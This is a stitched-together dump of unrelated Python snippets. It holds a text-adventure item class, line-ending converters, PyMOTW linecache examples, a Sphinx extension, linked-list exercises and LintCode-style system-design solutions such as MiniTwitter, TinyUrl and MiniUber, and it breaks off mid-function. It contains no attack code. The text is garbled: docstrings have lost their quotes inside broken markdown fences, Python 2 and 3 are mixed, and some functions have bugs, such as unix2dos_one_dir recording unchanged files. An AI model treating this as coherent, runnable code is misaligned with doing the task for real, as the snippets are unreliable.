version >= b"1.8.0"  # E: Unsupported operand types

from item import Item

class LightSource(Item):
    def __init__(self, name):
        Item.__init__(self, name)

    def on_take(self): pass

    def on_drop(self):
      print("\nEnable night vision. no wait we don't have night vision! Lets not drop that light!")```


```pyLine Encoding

    Given a string, return its encoding defined as follows:

    First, the string is divided into the least possible number
    of disjoint substrings consisting of identical characters

    Next, each substring with length greater than one is replaced
    with a concatenation of its length and the repeating character

    Finally, all the new strings are concatenated together in the
    same order and a new string is returned.

    Time Complexity: O(n)
    Space Complexity: O(1)```


```py


def lineEncoding(s):
    encoding, character_count = "", 1
    for i in range(len(s) - 1):
        if s[i] == s[i + 1]:
            character_count += 1
        else:
            if character_count > 1:
                encoding += str(character_count) + s[i]  # Add substring to encoding
                character_count = 1  # Reset character count
            else:
                encoding += s[i]

    if character_count > 1:
        encoding += str(character_count) + s[len(s) - 1]
    else:
        encoding += s[len(s) - 1]
    return encoding
````

```py Functions for converting from DOS to UNIX line endings

```

````py
import os
import re
import sys


def dos2unix(file):
    "Replace CRLF with LF in argument files.  Print names of changed files."
    if os.path.isdir(file):
        print(file, "Directory!")
        return

    with open(file, "rb") as fp:
        data = fp.read()
    if '\0' in data:
        print(file, "Binary!")
        return

    newdata = re.sub("\r\n", "\n", data)
    if newdata != data:
        print('dos2unix:', file)
        with open(file, "wb") as f:
            f.write(newdata)
        return file
    else:
        print(file, 'ok')

def dos2unix_one_dir(modified_files, dir_name, file_names):
    for file in file_names:
        full_path = os.path.join(dir_name, file)
        file = dos2unix(full_path)
        if file is not None:
            modified_files.append(file)

def dos2unix_dir(dir_name):
    modified_files = []
    os.path.walk(dir_name, dos2unix_one_dir, modified_files)
    return modified_files
#----------------------------------

def unix2dos(file):
    "Replace LF with CRLF in argument files.  Print names of changed files."
    if os.path.isdir(file):
        print(file, "Directory!")
        return

    with open(file, "rb") as fp:
        data = fp.read()
    if '\0' in data:
        print(file, "Binary!")
        return
    newdata = re.sub("\r\n", "\n", data)
    newdata = re.sub("\n", "\r\n", newdata)
    if newdata != data:
        print('unix2dos:', file)
        with open(file, "wb") as f:
            f.write(newdata)
        return file
    else:
        print(file, 'ok')

def unix2dos_one_dir(modified_files, dir_name, file_names):
    for file in file_names:
        full_path = os.path.join(dir_name, file)
        unix2dos(full_path)
        if file is not None:
            modified_files.append(file)

def unix2dos_dir(dir_name):
    modified_files = []
    os.path.walk(dir_name, unix2dos_one_dir, modified_files)
    return modified_files

if __name__ == "__main__":
    dos2unix_dir(sys.argv[1])

import math
from typing import Callable, Union


def line_length(
    fnc: Callable[[Union[int, float]], Union[int, float]],
    x_start: Union[int, float],
    x_end: Union[int, float],
    steps: int = 100,
) -> float:

    """
    Approximates the arc length of a line segment by treating the curve as a
    sequence of linear lines and summing their lengths
    :param fnc: a function which defines a curve
    :param x_start: left end point to indicate the start of line segment
    :param x_end: right end point to indicate end of line segment
    :param steps: an accuracy gauge; more steps increases accuracy
    :return: a float representing the length of the curve

    >>> def f(x):
    ...    return x
    >>> f"{line_length(f, 0, 1, 10):.6f}"
    '1.414214'

    >>> def f(x):
    ...    return 1
    >>> f"{line_length(f, -5.5, 4.5):.6f}"
    '10.000000'

    >>> def f(x):
    ...    return math.sin(5 * x) + math.cos(10 * x) + x * x/10
    >>> f"{line_length(f, 0.0, 10.0, 10000):.6f}"
    '69.534930'
    """

    x1 = x_start
    fx1 = fnc(x_start)
    length = 0.0

    for i in range(steps):

        # Approximates curve as a sequence of linear lines and sums their length
        x2 = (x_end - x_start) / steps + x1
        fx2 = fnc(x2)
        length += math.hypot(x2 - x1, fx2 - fx1)

        # Increment step
        x1 = x2
        fx1 = fx2

    return length


if __name__ == "__main__":

    def f(x):
        return math.sin(10 * x)

    print("f(x) = sin(10 * x)")
    print("The length of the curve from x = -10 to x = 10 is:")
    i = 10
    while i <= 100000:
        print(f"With {i} steps: {line_length(f, -10, 10, i)}")
        i *= 10

# Copyright 2016 Grist Labs, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import bisect
import re

_line_start_re = re.compile(r'^', re.M)

class LineNumbers(object):
  """
  Class to convert between character offsets in a text string, and pairs (line, column) of 1-based
  line and 0-based column numbers, as used by tokens and AST nodes.

  This class expects unicode for input and stores positions in unicode. But it supports
  translating to and from utf8 offsets, which are used by ast parsing.
  """
  def __init__(self, text):
    # A list of character offsets of each line's first character.
    self._line_offsets = [m.start(0) for m in _line_start_re.finditer(text)]
    self._text = text
    self._text_len = len(text)
    self._utf8_offset_cache = {}    # maps line num to list of char offset for each byte in line

  def from_utf8_col(self, line, utf8_column):
    """
    Given a 1-based line number and 0-based utf8 column, returns a 0-based unicode column.
    """
    offsets = self._utf8_offset_cache.get(line)
    if offsets is None:
      end_offset = self._line_offsets[line] if line < len(self._line_offsets) else self._text_len
      line_text = self._text[self._line_offsets[line - 1] : end_offset]

      offsets = [i for i,c in enumerate(line_text) for byte in c.encode('utf8')]
      offsets.append(len(line_text))
      self._utf8_offset_cache[line] = offsets

    return offsets[max(0, min(len(offsets)-1, utf8_column))]

  def line_to_offset(self, line, column):
    """
    Converts 1-based line number and 0-based column to 0-based character offset into text.
    """
    line -= 1
    if line >= len(self._line_offsets):
      return self._text_len
    elif line < 0:
      return 0
    else:
      return min(self._line_offsets[line] + max(0, column), self._text_len)

  def offset_to_line(self, offset):
    """
    Converts 0-based character offset to pair (line, col) of 1-based line and 0-based column
    numbers.
    """
    offset = max(0, min(self._text_len, offset))
    line_index = bisect.bisect_right(self._line_offsets, offset) - 1
    return (line_index + 1, offset - self._line_offsets[line_index])



import matplotlib.pyplot as plt
import numpy as np

x = [2, 4, 6, 8, 10, 12]

y = [2, 4, 6, 8, 10, 12]

plt.plot(x, y, 'b')
plt.xlabel('Inputs')
plt.ylabel('Steps')
plt.title('Linear Complexity')
plt.show()
import numpy as np
import pandas as pd
from sklearn.linear_model import LinearRegression
import matplotlib.pyplot as plt

# Read in csv file
# File: https://github.com/mGalarnyk/Python_Tutorials/blob/master/Python_Basics/Linear_Regression/linear.csv
raw_data = pd.read_csv("linear.csv")

# Removes rows with NaN in them
filtered_data = raw_data[~np.isnan(raw_data["y"])]

x_y = np.array(filtered_data)
x, y = x_y[:,0], x_y[:,1]

# Reshaping
x, y = x.reshape(-1,1), y.reshape(-1, 1)

# Linear Regression Object
lin_regression = LinearRegression()

# Fitting linear model to the data
lin_regression.fit(x,y)

# Get slope of fitted line
m = lin_regression.coef_

# Get y-Intercept of the Line
b = lin_regression.intercept_

# Get Predictions for original x values
# you can also get predictions for new data
predictions = lin_regression.predict(x)

# following slope intercept form
print "formula: y = {0}x + {1}".format(m, b)

# Plot the Original Model (Black) and Predictions (Blue)
plt.scatter(x, y,  color='black')
plt.plot(x, predictions, color='blue',linewidth=3)
plt.show()

__author__ = "Tobias Carryer"

from time import time


class LinearCongruentialGenerator:
    """
    A pseudorandom number generator.
    """

    def __init__(self, multiplier, increment, modulo, seed=int(time())):
        """
        These parameters are saved and used when nextNumber() is called.

        modulo is the largest number that can be generated (exclusive). The most
        efficient values are powers of 2. 2^32 is a common value.
        """
        self.multiplier = multiplier
        self.increment = increment
        self.modulo = modulo
        self.seed = seed

    def next_number(self):
        """
        The smallest number that can be generated is zero.
        The largest number that can be generated is modulo-1. modulo is set in the
        constructor.
        """
        self.seed = (self.multiplier * self.seed + self.increment) % self.modulo
        return self.seed


if __name__ == "__main__":
    # Show the LCG in action.
    lcg = LinearCongruentialGenerator(1664525, 1013904223, 2 << 31)
    while True:
        print(lcg.next_number())

#
# Linear search works in any array.
#
# T(n): O(n)
#


def linear_search(array, query):
    for i in range(len(array)):
        if array[i] == query:
            return i

    return -1

#!/usr/bin/env python3```


```pyExample use of linecache module.```


```py

#end_pymotw_header
import os
import tempfile

lorem = '''Lorem ipsum dolor sit amet, consectetuer
adipiscing elit.  Vivamus eget elit. In posuere mi non
risus. Mauris id quam posuere lectus sollicitudin
varius. Praesent at mi. Nunc eu velit. Sed augue massa,
fermentum id, nonummy a, nonummy sit amet, ligula. Curabitur
eros pede, egestas at, ultricies ac, apellentesque eu,
tellus.

Sed sed odio sed mi luctus mollis. Integer et nulla ac augue
convallis accumsan. Ut felis. Donec lectus sapien, elementum
nec, condimentum ac, interdum non, tellus. Aenean viverra,
mauris vehicula semper porttitor, ipsum odio consectetuer
lorem, ac imperdiet eros odio a sapien. Nulla mauris tellus,
aliquam non, egestas a, nonummy et, erat. Vivamus sagittis
porttitor eros.'''


def make_tempfile():
    fd, temp_file_name = tempfile.mkstemp()
    os.close(fd)
    with open(temp_file_name, 'wt') as f:
        f.write(lorem)
    return temp_file_name


def cleanup(filename):
    os.unlink(filename)

#!/usr/bin/env python3```


```pyExample use of linecache module.```


```py

#end_pymotw_header
import linecache
from linecache_data import *

filename = make_tempfile()

# Blank lines include the newline
print('BLANK : {!r}'.format(linecache.getline(filename, 8)))

cleanup(filename)

#!/usr/bin/env python3```


```pyExample use of linecache module.

See http://blog.doughellmann.com/2007/04/pymotw-linecache.html```


```py

#end_pymotw_header
import linecache
import os
import tempfile

lorem = '''Lorem ipsum dolor sit amet, consectetuer
adipiscing elit.  Vivamus eget elit. In posuere mi non
risus. Mauris id quam posuere lectus sollicitudin
varius. Praesent at mi. Nunc eu velit. Sed augue massa,
fermentum id, nonummy a, nonummy sit amet, ligula. Curabitur
eros pede, egestas at, ultricies ac, apellentesque eu,
tellus.

Sed sed odio sed mi luctus mollis. Integer et nulla ac augue
convallis accumsan. Ut felis. Donec lectus sapien, elementum
nec, condimentum ac, interdum non, tellus. Aenean viverra,
mauris vehicula semper porttitor, ipsum odio consectetuer
lorem, ac imperdiet eros odio a sapien. Nulla mauris tellus,
aliquam non, egestas a, nonummy et, erat. Vivamus sagittis
porttitor eros.'''

# Create a temporary text file with some text in it
fd, temp_file_name = tempfile.mkstemp()
os.close(fd)
with open(temp_file_name, 'wt') as f:
    f.write(lorem)

# Pick out the same line from source and cache.
# (Notice that linecache counts from 1)
print('SOURCE: ', lorem.split('\n')[4])
print('CACHE : ', linecache.getline(temp_file_name, 5).rstrip())

# Blank lines include the newline
print('\nBLANK : {!r}'.format(
    linecache.getline(temp_file_name, 6)))

# The cache always returns a string, and uses
# an empty string to indicate a line which does
# not exist.
not_there = linecache.getline(temp_file_name, 500)
print('\nNOT THERE: {!r} includes {} characters'.format(
    not_there, len(not_there)))

# Errors are even hidden if linecache cannot find the file
no_such_file = linecache.getline(
    'this_file_does_not_exist.txt', 1)
print('\nNO FILE: ', no_such_file)

# Look for the linecache module, using
# the built in sys.path search.
module_line = linecache.getline('linecache.py', 3)
print('\nMODULE : ', module_line)

# Clean up
os.unlink(temp_file_name)

#!/usr/bin/env python3```


```pyExample use of linecache module.```


```py

#end_pymotw_header
import linecache
from linecache_data import *

filename = make_tempfile()

# Pick out the same line from source and cache.
# (Notice that linecache counts from 1)
print('SOURCE:')
print('{!r}'.format(lorem.split('\n')[4]))
print()
print('CACHE:')
print('{!r}'.format(linecache.getline(filename, 5)))

cleanup(filename)

```









---


```py



#end_pymotw_header
import linecache

# Errors are even hidden if linecache cannot find the file
no_such_file = linecache.getline(
    'this_file_does_not_exist.txt', 1,
)
print('NO FILE: {!r}'.format(no_such_file))

#!/usr/bin/env python3```


```pyExample use of linecache module.```


```py

#end_pymotw_header
import linecache
from linecache_data import *

filename = make_tempfile()

# The cache always returns a string, and uses
# an empty string to indicate a line which does
# not exist.
not_there = linecache.getline(filename, 500)
print('NOT THERE: {!r} includes {} characters'.format(
    not_there, len(not_there)))

cleanup(filename)

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


#end_pymotw_header
import linecache
import os

# Look for the linecache module, using
# the built in sys.path search.
module_line = linecache.getline('linecache.py', 3)
print('MODULE:')
print(repr(module_line))

# Look at the linecache module source directly.
file_src = linecache.__file__
if file_src.endswith('.pyc'):
    file_src = file_src[:-1]
print('\nFILE:')
with open(file_src, 'r') as f:
    file_line = f.readlines()[2]
print(repr(file_line))
````

````py
    sphinx.ext.linkcode
    ~~~~~~~~~~~~~~~~~~~

    Add external links to module code in Python object descriptions.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from typing import Any, Dict, Set

from docutils import nodes
from docutils.nodes import Node

import sphinx
from sphinx import addnodes
from sphinx.application import Sphinx
from sphinx.errors import SphinxError
from sphinx.locale import _


class LinkcodeError(SphinxError):
    category = "linkcode error"


def doctree_read(app: Sphinx, doctree: Node) -> None:
    env = app.builder.env

    resolve_target = getattr(env.config, 'linkcode_resolve', None)
    if not callable(env.config.linkcode_resolve):
        raise LinkcodeError(
            "Function `linkcode_resolve` is not given in conf.py")

    domain_keys = {
        'py': ['module', 'fullname'],
        'c': ['names'],
        'cpp': ['names'],
        'js': ['object', 'fullname'],
    }

    for objnode in doctree.traverse(addnodes.desc):
        domain = objnode.get('domain')
        uris: Set[str] = set()
        for signode in objnode:
            if not isinstance(signode, addnodes.desc_signature):
                continue

            # Convert signode to a specified format
            info = {}
            for key in domain_keys.get(domain, []):
                value = signode.get(key)
                if not value:
                    value = ''
                info[key] = value
            if not info:
                continue

            # Call user code to resolve the link
            uri = resolve_target(domain, info)
            if not uri:
                # no source
                continue

            if uri in uris or not uri:
                # only one link per name, please
                continue
            uris.add(uri)

            inline = nodes.inline('', _('[source]'), classes=['viewcode-link'])
            onlynode = addnodes.only(expr='html')
            onlynode += nodes.reference('', '', inline, internal=False, refuri=uri)
            signode += onlynode


def setup(app: Sphinx) -> Dict[str, Any]:
    app.connect('doctree-read', doctree_read)
    app.add_config_value('linkcode_resolve', None, '')
    return {'version': sphinx.__display_version__, 'parallel_read_safe': True}

class LinkedListNode:
    def __init__(self, data=None, next=None):
        self.data = data
        self.next = next


class LinkedList:
    def __init__(self, head=None):
        self.head = head

    def append(self, data):
        new_node = LinkedListNode(data)
        if self.head:
            current = self.head
            while current.next:
                current = current.next
            current.next = new_node
        else:
            self.head = new_node


a = LinkedListNode(1)
my_ll = LinkedList(a)
my_ll.append(2)
my_ll.append(3)
my_ll.head.data
my_ll.head.next.data
my_ll.head.next.next.data
print('my_ll = LinkedList(a):', my_ll)
print('my_ll.append(2):', my_ll)
print('my_ll.append(3):', my_ll)
print('my_ll.head.data:', my_ll.head.data)
print('my_ll.head.next.data:', my_ll.head.next.data)
print('my_ll.head.next.next.data:', my_ll.head.next.next.data)

# linked list creation
# singly linked list


class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


class LinkedList:
    def __init__(self):
        self.head = None

    def PrintList(self):
        if self.head is not None:
            itr = self.head
            while itr:
                print(itr.data, end="-->")
                itr = itr.next


if __name__ == "__main__":
    # creating empty linked list
    l = LinkedList()
    # assigning the first node to head of linked list
    l.head = Node(1)
    # assigining the second node
    l2 = Node(2)
    # assigining the third node
    l3 = Node(3)

    # linking the first node to the second
    l.head.next = l2
    # linking the second node to the third
    l2.next = l3

    # printing the list
    l.PrintList()
````

```pyThe LinkedList code from before is provided below.
Add three functions to the LinkedList.
"get_position" returns the element at a certain position.
The "insert" function will add an element to a particular
spot in the list.
"delete" will delete the first element with that
particular value.
Then, use "Test Run" and "Submit" to run the test cases
at the bottom."""

class Element(object):
    def __init__(self, value):
        self.value = value
        self.next = None

class LinkedList(object):
    def __init__(self, head=None):
        self.head = head

    def append(self, new_element):
        current = self.head
        if self.head:
            while current.next:
                current = current.next
            current.next = new_element
        else:
            self.head = new_element

    def get_position(self, position):
        """Get an element from a particular position.
        Assume the first position is "1".
        Return "None" if position is not in the list."""
        current = self.head
        if(self.head):
            for i in range(position)[1:]:
                if(current.next==None):
                    return None
                else:
                    current=current.next
            return current
        return None

    def insert(self, new_element, position):
        """Insert a new node at the given position.
        Assume the first position is "1".
        Inserting at position 3 means between
        the 2nd and 3rd elements."""
        current = self.head
        if(self.head):
            for i in range(position)[1:]:
                if(i==position-1):
                    after = current.next
                    current.next = new_element
                    new_element.next = after
                elif(current.next!=None):
                    current = current.next
                else:
                    return 'position out of bounds'
        pass


    def delete(self, value):
        """Delete the first node with a given value."""
        current = self.head
        if(self.head):
            while(current.next!=None):
                if(current.next.value==value):
                    after = current.next.next
                    current.next = after
                else:
                    current = current.next

        if(self.head.value==value):
            after = self.head.next
            self.head = after
        pass

# Test cases
# Set up some Elements
e1 = Element(1)
e2 = Element(2)
e3 = Element(3)
e4 = Element(4)

# Start setting up a LinkedList
ll = LinkedList(e1)
ll.append(e2)
ll.append(e3)

# Test get_position
# Should print 3
print ll.head.next.next.value
# Should also print 3
print ll.get_position(3).value

# Test insert
ll.insert(e4,3)
# Should print 4 now
print ll.get_position(3).value

# Test delete
ll.delete(1)
# Should print 2 now
print ll.get_position(1).value
# Should print 4 now
print ll.get_position(2).value
# Should print 3 now
print ll.get_position(3).value

class Solution:
    """
    @param nums: A list of integers
    @return: A list of integers includes the index of the first number and the index of the last number
    """

    def subarraySum(self, nums):
        d = {0: -1}
        prefix_sum = 0
        for i, v in enumerate(nums):
            prefix_sum += v
            if prefix_sum in d:
                return [d[prefix_sum] + 1, i]
            d[prefix_sum] = i
        return [-1, -1]

class Solution:
    """
    @param: timestamp: the current timestamp
    @param: event: the string to distinct different event
    @param: rate: the format is [integer]/[s/m/h/d]
    @param: increment: whether we should increase the counter
    @return: true or false to indicate the event is limited or not
    """

    def __init__(self):
        self.logs = {}

    def isRatelimited(self, timestamp, event, rate, increment):
        separator = rate.find("/")
        total_time = int(rate[:separator])
        unit = rate[separator + 1 :]

        delta = 0
        if unit == "s":
            delta = 1
        elif unit == "m":
            delta = 60
        elif unit == "h":
            delta = 60 * 60
        else:
            delta = 60 * 60 * 24

        if event not in self.logs:
            self.logs[event] = []

        is_limited = (
            self.find_event(self.logs[event], timestamp - delta + 1) >= total_time
        )
        if increment and not is_limited:
            self.logs[event].append(timestamp)

        return is_limited

    def find_event(self, events, start_time):
        l, r = 0, len(events) - 1
        if r < 0 or events[r] < start_time:
            return 0

        below = 0
        while l <= r:
            mid = l + (r - l) // 2
            if events[mid] >= start_time:
                below = mid
                r = mid - 1
            else:
                l = mid + 1
        return len(events) - below

class Solution(object):

    # @param nestedList a list, each element in the list
    # can be a list or integer, for example [1,2,[1,2]]
    # @return {int[]} a list of integer
    def flatten(self, nestedList):
        stack = [nestedList]
        result = []
        while stack:
            top = stack.pop()
            if isinstance(top, list):
                stack.extend(top[::-1])
            else:
                result.append(top)
        return result
```

````py
class Comparator:
    def cmp(self, a, b)
You can use Compare.cmp(a, b) to compare nuts "a" and bolts "b",
if "a" is bigger than "b", it will return 1, else if they are equal,
it will return 0, else if "a" is smaller than "b", it will return -1.
When "a" is not a nut or "b" is not a bolt, it will return 2, which is not valid.```


```py


class Solution:
    # @param nuts: a list of integers
    # @param bolts: a list of integers
    # @param compare: a instance of Comparator
    # @return: nothing
    def sortNutsAndBolts(self, nuts, bolts, compare):
        if not nuts or not bolts or len(nuts) != len(bolts):
            return

        self.qsort(nuts, bolts, compare, 0, len(nuts) - 1)

    def qsort(self, nuts, bolts, compare, l, u):
        if l >= u:
            return

        # use bolts[l] to partition nuts into three sequences
        # nuts[l...part_idx], nuts[part_idx], nuts[part_idx+1...u]
        part_idx = self.partition(nuts, bolts[l], compare, l, u)

        # bolts[l...part_idx-1], bolts[part_idx]==original bolts[l], bolts[part_idx+1...u]
        self.partition(bolts, nuts[part_idx], compare, l, u)

        self.qsort(nuts, bolts, compare, l, part_idx - 1)
        self.qsort(nuts, bolts, compare, part_idx + 1, u)

    def partition(self, s, pivot, compare, l, u):
        for i in range(l, u + 1):
            if compare.cmp(s[i], pivot) == 0 or compare.cmp(pivot, s[i]) == 0:
                s[l], s[i] = s[i], s[l]

        now = s[l]
        left = l
        right = u
        while left < right:
            while left < right and (
                compare.cmp(s[right], pivot) == 1 or compare.cmp(pivot, s[right]) == -1
            ):
                right -= 1

            s[left] = s[right]
            while left < right and (
                compare.cmp(s[left], pivot) == -1 or compare.cmp(pivot, s[left]) == 1
            ):
                left += 1
            s[right] = s[left]
        s[left] = now

        return left

class Solution:
    """
    @param: A: An integer array
    @return: A list of integers includes the index of the first number and the index of the last number
    """

    def continuousSubarraySum(self, A):
        result = float("-inf")
        sum = 0
        start, end = 0, -1
        output = None
        for i in A:
            if sum < 0:
                sum = i
                start = end + 1
                end = start
            else:
                sum += i
                end += 1
            if sum > result:
                result = sum
                output = [start, end]
        return output

class Solution:
    """
    @param: matrix: an integer matrix
    @return: the coordinate of the left-up and right-down number
    """

    def submatrixSum(self, matrix):
        if not matrix or not matrix[0]:
            return None
        m, n = len(matrix), len(matrix[0])
        for top in range(m):
            row = [0] * n
            for bottom in range(top, m):
                prefix_sum = 0
                d = {0: -1}
                for j in range(n):
                    row[j] += matrix[bottom][j]
                    prefix_sum += row[j]
                    if prefix_sum in d:
                        return [[top, d[prefix_sum] + 1], [bottom, j]]
                    d[prefix_sum] = j
        return None

class WordCount:

    # @param {str} line a text, for example "Bye Bye see you next"
    def mapper(self, _, line):
        # Write your code here
        # Please use 'yield key, value'
        for word in line.split():
            yield word, 1

    # @param key is from mapper
    # @param values is a set of value with the same key
    def reducer(self, key, values):
        # Write your code here
        # Please use 'yield key, value'
        yield key, sum(values)
````

````py
Definition of Tweet:
class Tweet:
    @classmethod
    def create(cls, user_id, tweet_text):
         # This will create a new tweet object,
         # and auto fill id```


```py


class MiniTwitter:
    def __init__(self):
        self.order = 0
        self.users_tweets = {}
        self.friends = {}

    """
    @param: user_id: An integer
    @param: tweet_text: a string
    @return: a tweet
    """

    def postTweet(self, user_id, tweet_text):
        tweet = Tweet.create(user_id, tweet_text)
        self.order += 1
        if user_id in self.users_tweets:
            self.users_tweets[user_id].append((self.order, tweet))
        else:
            self.users_tweets[user_id] = [(self.order, tweet)]
        return tweet

    """
    @param: user_id: An integer
    @return: a list of 10 new feeds recently and sort by timeline
    """

    def getNewsFeed(self, user_id):
        feeds = []
        if user_id in self.users_tweets:
            feeds = self.users_tweets[user_id][-10:]
        if user_id in self.friends:
            for friend in self.friends[user_id]:
                if friend in self.users_tweets:
                    feeds.extend(self.users_tweets[friend][-10:])
        feeds.sort(key=lambda x: x[0])
        return [feed[1] for feed in feeds[-10:][::-1]]

    """
    @param: user_id: An integer
    @return: a list of 10 new posts recently and sort by timeline
    """

    def getTimeline(self, user_id):
        if user_id in self.users_tweets:
            return [t[1] for t in self.users_tweets[user_id][-10:][::-1]]
        else:
            return []

    """
    @param: from_user_id: An integer
    @param: to_user_id: An integer
    @return: nothing
    """

    def follow(self, from_user_id, to_user_id):
        if from_user_id not in self.friends:
            self.friends[from_user_id] = set()
        self.friends[from_user_id].add(to_user_id)

    """
    @param: from_user_id: An integer
    @param: to_user_id: An integer
    @return: nothing
    """

    def unfollow(self, from_user_id, to_user_id):
        if from_user_id not in self.friends:
            return
        self.friends[from_user_id].remove(to_user_id)
````

````py
Definition of Column:
class Column:
    def __init__(self, key, value):
        self.key = key
        self.value = value```


```py


class MiniCassandra:
    def __init__(self):
        self.memory = {}

    """
    @param: row_key: a string
    @param: column_key: An integer
    @param: value: a string
    @return: nothing
    """

    def insert(self, row_key, column_key, value):
        if row_key not in self.memory:
            self.memory[row_key] = {}
        self.memory[row_key][column_key] = value

    """
    @param: row_key: a string
    @param: column_start: An integer
    @param: column_end: An integer
    @return: a list of Columns
    """

    def query(self, row_key, column_start, column_end):
        result = []
        if row_key in self.memory:
            for i in range(column_start, column_end + 1):
                if i in self.memory[row_key]:
                    result.append(Column(i, self.memory[row_key][i]))
        return result

class Anagram:

    # @param {str} line a text, for example "Bye Bye see you next"
    def mapper(self, _, line):
        # Write your code here
        # Please use 'yield key, value' here
        for word in line.split():
            yield "".join(sorted(list(word))), word

    # @param key is from mapper
    # @param values is a set of value with the same key
    def reducer(self, key, values):
        # Write your code here
        # Please use 'yield key, value' here
        yield key, list(values)
````

````py
Definition of Document
class Document:
    def __init__(self, id, cotent):
        self.id = id
        self.content = content```


```py


class InvertedIndex:

    # @param {Document} value is a document
    def mapper(self, _, value):
        # Write your code here
        # Please use 'yield key, value' here
        for word in value.content.split():
            yield word, value.id

    # @param key is from mapper
    # @param values is a set of value with the same key
    def reducer(self, key, values):
        # Write your code here
        # Please use 'yield key, value' here
        yield key, sorted(list(set(values)))

import bisect


class WebLogger:
    def __init__(self):
        self.queue = []

    """
    @param: timestamp: An integer
    @return: nothing
    """

    def hit(self, timestamp):
        self.queue.append(timestamp)

    """
    @param: timestamp: An integer
    @return: An integer
    """

    def get_hit_count_in_last_5_minutes(self, timestamp):
        ddl = timestamp - 300
        index = bisect.bisect_right(self.queue, ddl)
        return len(self.queue) - index

class Solution:
    """
    @param: n: a positive integer
    @return: n x 3 matrix
    """

    def consistentHashing(self, n):
        results = [[0, 359, 1]]
        for i in range(1, n):
            index = 0
            for j in range(i):
                if (
                    results[j][1] - results[j][0] + 1
                    > results[index][1] - results[index][0] + 1
                ):
                    index = j

            x, y = results[index][0], results[index][1]
            results[index][1] = (x + y) // 2
            results.append([(x + y) // 2 + 1, y, i + 1])

        return results

import bisect
import random


class Solution:
    """
    @param {int} n a positive integer
    @param {int} k a positive integer
    @return {Solution} a Solution object
    """

    @classmethod
    def create(cls, n, k):
        solution = cls()
        solution.ids = {}
        solution.machines = {}
        solution.n = n
        solution.k = k
        return solution

    """
    @param: machine_id: An integer
    @return: a list of shard ids
    """

    def addMachine(self, machine_id):
        ids = []
        for i in range(self.k):
            index = random.randint(0, self.n - 1)
            while index in self.ids:
                index = random.randint(0, self.n - 1)

            ids.append(index)
            self.ids[index] = 0
            ids.sort()
            self.machines[machine_id] = ids
        return ids

    """
    @param: hashcode: An integer
    @return: A machine id
    """

    def getMachineIdByHashCode(self, hashcode):
        machine_id = None
        distance = self.n - 1

        for key, value in self.machines.items():
            index = bisect.bisect_left(value, hashcode) % len(value)
            d = value[index] - hashcode
            if d < 0:
                d += self.n

            if d < distance:
                distance = d
                machine_id = key
        return machine_id

import string
import random


class TinyUrl2:
    def __init__(self):
        self.long2short = {}
        self.short2long = {}

    """
    @param: long_url: a long url
    @param: key: a short key
    @return: a short url starts with http://tiny.url/
    """

    def createCustom(self, long_url, key):
        short_url = "http://tiny.url/" + key
        if long_url in self.long2short:
            if self.long2short[long_url] == short_url:
                return short_url
            else:
                return "error"
        if short_url in self.short2long:
            return "error"
        self.long2short[long_url] = short_url
        self.short2long[short_url] = long_url
        return short_url

    """
    @param: long_url: a long url
    @return: a short url starts with http://tiny.url/
    """

    def longToShort(self, long_url):
        if long_url in self.long2short:
            return self.long2short[long_url]
        code_pool = string.ascii_letters + "0123456789"
        code = "http://tiny.url/" + "".join(random.choice(code_pool) for _ in range(6))
        while code in self.short2long:
            code = "".join(random.choice(code_pool) for _ in range(6))
        self.long2short[long_url] = code
        self.short2long[code] = long_url
        return code

    """
    @param: short_url: a short url starts with http://tiny.url/
    @return: a long url
    """

    def shortToLong(self, short_url):
        if short_url in self.short2long:
            return self.short2long[short_url]
        return "error"
````

````py
Definition of Trip:
class Trip:
    self.id; # trip's id, primary key
    self.driver_id, self.rider_id; # foreign key
    self.lat, self.lng; # pick up location
    def __init__(self, rider_id, lat, lng):

Definition of Helper
class Helper:
    @classmethod
    def get_distance(cls, lat1, lng1, lat2, lng2):
        # return calculate the distance between (lat1, lng1) and (lat2, lng2)```


```py
from Trip import Trip, Helper


class Location:
    def __init__(self, lat, lng):
        self.lat = lat
        self.lng = lng


class MiniUber:
    def __init__(self):
        self.driver2location = {}
        self.driver2trip = {}

    # @param {int} driver_id an integer
    # @param {double} lat, lng driver's location
    # return {trip} matched trip information if there have matched rider or null
    def report(self, driver_id, lat, lng):
        if driver_id in self.driver2trip:
            return self.driver2trip[driver_id]

        if driver_id in self.driver2location:
            self.driver2location[driver_id].lat = lat
            self.driver2location[driver_id].lng = lng
        else:
            self.driver2location[driver_id] = Location(lat, lng)

        return None

    # @param rider_id an integer
    # @param lat, lng rider's location
    # return a trip
    def request(self, rider_id, lat, lng):
        trip = Trip(rider_id, lat, lng)
        distance, driver_id = -1, -1

        for key, value in self.driver2location.items():
            dis = Helper.get_distance(value.lat, value.lng, lat, lng)
            if distance < 0 or distance > dis:
                driver_id = key
                distance = dis

        if driver_id != -1:
            del self.driver2location[driver_id]

        trip.driver_id = driver_id
        self.driver2trip[driver_id] = trip

        return trip

import random


class LoadBalancer:
    def __init__(self):
        self.cluster = []
        self.id2index = {}

    """
    @param: server_id: add a new server to the cluster
    @return: nothing
    """

    def add(self, server_id):
        if server_id in self.id2index:
            return
        self.cluster.append(server_id)
        self.id2index[server_id] = len(self.cluster) - 1

    """
    @param: server_id: server_id remove a bad server from the cluster
    @return: nothing
    """

    def remove(self, server_id):
        if server_id not in self.id2index:
            return
        idx = self.id2index[server_id]

        self.id2index[self.cluster[-1]] = idx
        self.cluster[-1], self.cluster[idx] = self.cluster[idx], self.cluster[-1]

        del self.id2index[server_id]
        self.cluster.pop()

    """
    @return: pick a server in the cluster randomly with equal probability
    """

    def pick(self):
        index = random.randint(0, len(self.cluster) - 1)
        return self.cluster[index]

class GeoHash:
    """
    @param: latitude: one of a location coordinate pair
    @param: longitude: one of a location coordinate pair
    @param: precision: an integer between 1 to 12
    @return: a base32 string
    """

    def encode(self, latitude, longitude, precision):
        _base32 = "0123456789bcdefghjkmnpqrstuvwxyz"
        latitude_bin = self.get_bin(latitude, -90, 90)
